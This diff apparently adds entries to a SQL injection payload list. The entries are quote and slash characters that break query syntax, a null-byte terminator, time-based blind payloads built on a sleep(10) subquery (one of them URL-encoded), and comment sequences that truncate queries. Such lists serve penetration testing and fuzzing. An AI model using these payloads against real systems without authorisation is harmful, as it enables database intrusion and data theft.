@@ -2,3 +2,25 @@
 ''
 `
 ``
+,
+"
+""
+/
+//
+\
+\\
+;%00	Nullbyte
+
+
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+
+
+Comments:
+
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
